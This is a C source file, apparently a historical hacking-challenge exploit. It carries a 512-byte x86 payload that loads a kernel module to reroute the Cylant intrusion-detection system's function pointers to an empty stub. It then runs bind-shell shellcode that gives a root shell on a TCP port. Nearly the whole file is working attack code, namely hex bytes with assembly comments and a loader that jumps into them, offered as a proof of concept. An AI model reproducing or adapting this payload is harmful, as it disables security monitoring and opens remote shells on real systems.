/*
Juergen Pabel
juergen@pabel.net

This is an exploit to disable the cylant system. It needs to be run as root. It simply
inserts a kernel module which re-routes some function pointers to point to a function
that does nothing (contained in my module code). By doing this the cylant defense system
is effectively disabled. This code uses hardcoded (!) values for the pointer addresses,
which you will need to adapt if you want to use it on any other build then the build that
was used for their hacking challenge (i believe it was kernel 2.2.18, cylant version 1.1).
in any case, i hope i don't have to say that with any other version this code will crash
and burn...

I have set up my code to be 512 bytes total, to fit into one udp packet, which i planned
on sending to my udp-downloader code....unfortunately i ran out of time and did not find
a working exploit which would allow my udp-downloader to run. i have testet this code
locally on my own system and it works like a charm.

lastly, a short outline of this code:

- demasq's the rest of the packet (each byte after the initial code (64bytes) is decreased
  by 3...there was no 0xfd in the packet)
- insert the module into the kernel
  - the module's init function reroutes the function pointers to the function stub in the
    module code
- bind a shell to a tcp port (i'll leave it to you to figure out which one...take it as a
  script kiddie protection, even though i doubt this will find any real use...it's more of a
  proof of concept)

i want to congratulate all the (very nice and helpful) people at cylant for a fine
product (they were already working on a fix to this particular attack, so this attack
probably won't work in newer versions of cylant's software). greetings go to spender,
oasis, my rugby buddy: destructive force

credits go to ron1n for writting the port binding shell code, which i ripped from
his statdx exploit.

i take no responsibility for what you do with this...

*/

int main (int argc, char* argv[])
{
char moduleloader[] = {
//masq'ing ascii 0 (size = 64 bytes)
//takes the next 448 bytes and decreases each byte by 3 (ascii \0 avoidance)
0x31, 0xc9, 0xe3, 0x02, 0xe3, 0x05, 0xe8, 0xf9, 0xff, 0xff, 0xff, 0x58,
0x83, 0xe8, 0x0b, 0x89, 0xc6, 0x31, 0xc9, 0x41, 0xd0, 0xe1, 0xd0, 0xe1,
0xd0, 0xe1, 0xd0, 0xe1, 0xd0, 0xe1, 0xd0, 0xe1, 0x01, 0xce, 0x66, 0xb9,
0xc0, 0x01, 0xfe, 0x0e, 0xfe, 0x0e, 0xfe, 0x0e, 0x46, 0x49, 0xe3, 0x05,
0xe9, 0xf1, 0xff, 0xff, 0xff, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90,

//module loader, jumps to code at end after module loading (size = 84)
0xe8, 0x00, 0x00, 0x00, 0x00, 0x5b, 0x83, 0xeb, 0x05, 0xb8, 0x7f, 0x00,
0x00, 0x00, 0x81, 0xc3, 0x60, 0x00, 0x00, 0x00, 0x83, 0xc3, 0x48, 0xb9,
0x00, 0x01, 0x00, 0x00, 0xcd, 0x80, 0x89, 0xc2, 0x83, 0xeb, 0x48, 0xc7,
0x43, 0x00, 0x48, 0x00, 0x00, 0x00, 0xc7, 0x43, 0x0c, 0x00, 0x01, 0x00,
0x00, 0x83, 0xc2, 0x48, 0x89, 0x53, 0x08, 0x83, 0xc2, 0x08, 0x89, 0x53,
0x2c, 0xb8, 0x80, 0x00, 0x00, 0x00, 0x83, 0xc3, 0x48, 0x89, 0xd9, 0x83,
0xe9, 0x48, 0xcd, 0x80, 0x31, 0xc9, 0x0f, 0x83, 0xcc, 0x00, 0x00, 0x00,

//padding (size = 12) : total = 160
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,



// ---- ==== END OF MODULE LOADER, next is module code ==== ----

//struct module (size = 72 bytes)
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

//module name : jpabel + 2 0x00's (size = 8)
0x6a, 0x70, 0x61, 0x62, 0x65, 0x6c, 0x00, 0x00,

//module content (size == 96)
    /* module init */
    0xe8, 0x00, 0x00, 0x00, 0x00,      /* calln 0      */
    0x58,                              /* pop eax      */
    0x83, 0xe8, 0x05,                  /* sub eax, 5   */
//9
    0x89, 0xc1,                        /* mov ecx, eax */
    0x83, 0xc1, 0x60,                  /* add ecx, FUNC w/ 6 params */
//5
    /* reroute rid_inst_ip (6 params) */
    0xba, 0x6c, 0x94, 0x25, 0xc0,      /* mov edx, PTR */
    0x89, 0x0a,                        /* mov [edx],ecx*/
//7
    0x83, 0xc1, 0x04,                 /* add ecx, 4 (from 6 params -> 2 params) */
//3
    /* reroute cyl_inst_pid (2 params) */
    0xba, 0x64, 0x94, 0x25, 0xc0,      /* mov edx, PTR */
    0x89, 0x0a,                        /* mov [edx],ecx*/
    /* reroute rid_inst_pid (2 params) */
    0xba, 0x70, 0x94, 0x25, 0xc0,      /* mov edx, PTR */
    0x89, 0x0a,                        /* mov [edx],ecx*/
//14
    0x83, 0xc1, 0x01,                 /* add ecx, 1 (from 2 params -> 1 param) */
//3
    /* reroute aria_inst_kout (1 param) */
    0xba, 0x50, 0x94, 0x25, 0xc0,      /* mov edx, PTR */
    0x89, 0x0a,                        /* mov [edx],ecx*/
    /* reroute rids_should_profile (1 param) */
    0xba, 0x5c, 0x94, 0x25, 0xc0,      /* mov edx, PTR */
    0x89, 0x0a,                        /* mov [edx],ecx*/
    /* reroute rids_pid_release_task (1 param) */
    0xba, 0x74, 0x94, 0x25, 0xc0,      /* mov edx, PTR */
    0x89, 0x0a,                        /* mov [edx],ecx*/
    /* reroute rids_pid_tag_task (1 param) */
    0xba, 0x78, 0x94, 0x25, 0xc0,      /* mov edx, PTR */
    0x89, 0x0a,                        /* mov [edx],ecx*/
    /* reroute rids_should_drop ip (1 param) */
    0xba, 0x7c, 0x94, 0x25, 0xc0,      /* mov edx, PTR */
    0x89, 0x0a,                        /* mov [edx],ecx*/
//35
    /* leave module init function */
    0xb8, 0x00, 0x00, 0x00, 0x00,      /* mov eax, 0   */
    0xc3,                              /* ret          */
//6
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90,/* NOPs         */
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90,/* NOPs         */
    0x90, 0x90,                        /* NOPs         */
//14

//cylant empty function (size == 12)
    /* placebo function (offset depends on param count) */
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90,/* NOPs       */
    0xb8, 0x00, 0x00, 0x00, 0x00,      /* mov eax, 0 */
    0xc3,                              /* ret        */

//padding (size == 4) for total size of 192 bytes for module
//and 352 bytes total so far
0x90, 0x90, 0x90, 0x90,

// ------- shellcode ----------
//size is 133


  0x31, 0xc0                              /* xorl   %eax,%eax             */
/* jmp ricochet ------------------------------------------------------- */
, 0xeb, 0x7c                              /* jmp    0x7c                  */
/* kungfu: ------------------------------------------------------------ */
, 0x59                                  /* popl   %ecx                  */
, 0x89, 0x41, 0x10                          /* movl   %eax,0x10(%ecx)       */
/* ------------------------------------ socket(2,1,0); ---------------- */
, 0x89, 0x41, 0x08                          /* movl   %eax,0x8(%ecx)        */
, 0xfe, 0xc0                              /* incb   %al                   */
, 0x89, 0x41, 0x04                          /* movl   %eax,0x4(%ecx)        */
, 0x89, 0xc3                              /* movl   %eax,%ebx             */
/*, 0xfe, 0xc0*/                              /* incb   %al                   */
,0x40	/*incl %eax*/
, 0x89, 0x01                              /* movl   %eax,(%ecx)           */
, 0xb0, 0x66                              /* movb   $0x66,%al             */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ------------------------------------ bind(sd,&sockaddr,16); -------- */
, 0xb3, 0x02                              /* movb   $0x2,%bl              */
, 0x89, 0x59, 0x0c                          /* movl   %ebx,0xc(%ecx)        */
, 0xc6, 0x41, 0x0e, 0x99                      /* movb   $0x99,0xe(%ecx)       */
, 0xc6, 0x41, 0x08, 0x10                      /* movb   $0x10,0x8(%ecx)       */
, 0x89, 0x49, 0x04                          /* movl   %ecx,0x4(%ecx)        */
, 0x80, 0x41, 0x04, 0x0c                      /* addb   $0xc,0x4(%ecx)        */
, 0x88, 0x01                              /* movb   %al,(%ecx)            */
, 0xb0, 0x66                              /* movb   $0x66,%al             */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ------------------------------------ listen(sd,blah); -------------- */
, 0xb3, 0x04                              /* movb   $0x4,%bl              */
, 0xb0, 0x66                              /* movb   $0x66,%al             */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ------------------------------------ accept(sd,0,16); -------------- */
, 0xb3, 0x05                              /* movb   $0x5,%bl              */
/*, 0x30, 0xc0 */                             /* xorb   %al,%al               */
/*, 0x88, 0x41, 0x04                           movb   %al,0x4(%ecx)         */

//,0x90, 0x90,
,0x89, 0x49, 0x04 //idea: movl %ecx, 4(%ecx)
,0x89, 0x49, 0x08 //idea: movl %ecx, 8(%ecx)


, 0xb0, 0x66                              /* movb   $0x66,%al             */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ------------------------------------ dup2(cd,0); ------------------- */
, 0x89, 0xce                              /* movl   %ecx,%esi             */
, 0x88, 0xc3                              /* movb   %al,%bl               */
, 0x31, 0xc9                              /* xorl   %ecx,%ecx             */
, 0xb0, 0x3f                              /* movb   $0x3f,%al             */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ------------------------------------ dup2(cd,1); ------------------- */
, 0xfe, 0xc1                              /* incb   %cl                   */
, 0xb0, 0x3f                              /* movb   $0x3f,%al             */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ------------------------------------ dup2(cd,2); ------------------- */
, 0xfe, 0xc1                              /* incb   %cl                   */
, 0xb0, 0x3f                              /* movb   $0x3f,%al             */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ------------------------------------ execve(/bin/sh,argv,0); ----- */
, 0xc7, 0x06, 0x2f, 0x62, 0x69, 0x6e              /* movl   $0x6e69622f,(%esi)    */
, 0xc7, 0x46, 0x04, 0x2f, 0x73, 0x68, 0x41          /* movl   $0x4168732f,0x4(%esi) */
, 0x30, 0xc0                              /* xorb   %al,%al               */
, 0x88, 0x46, 0x07                          /* movb   %al,0x7(%esi)         */
, 0x89, 0x76, 0x0c                          /* movl   %esi,0xc(%esi)        */
, 0x8d, 0x56, 0x10                          /* leal   0x10(%esi),%edx       */
, 0x8d, 0x4e, 0x0c                          /* leal   0xc(%esi),%ecx        */
, 0x89, 0xf3                              /* movl   %esi,%ebx             */
, 0xb0, 0x0b                              /* movb   $0xb,%al              */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ------------------------------------ exit(blah); ------------------- */
, 0xb0, 0x01                              /* movb   $0x1,%al              */
, 0xcd, 0x80                              /* int    $0x80                 */
/* ricochet: call kungfu ---------------------------------------------- */
, 0xe8, 0x7f, 0xff, 0xff, 0xff,                 /* call   -0x81                 */


//padding size=27, TOTAL = 512
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90
};
char* pointer;

//printf("%d", sizeof(moduleloader));
//return 0;

{ //masq ascii 0 bytes
int i;
for(i=64;i<512;i++)
	moduleloader[i] = moduleloader[i]+3;
}

pointer = &moduleloader[0];
asm volatile ("movl %ebp, %eax");
asm volatile ("subl $520, %eax");
asm volatile ("pushl %eax");
asm volatile ("ret");

return 0;
}
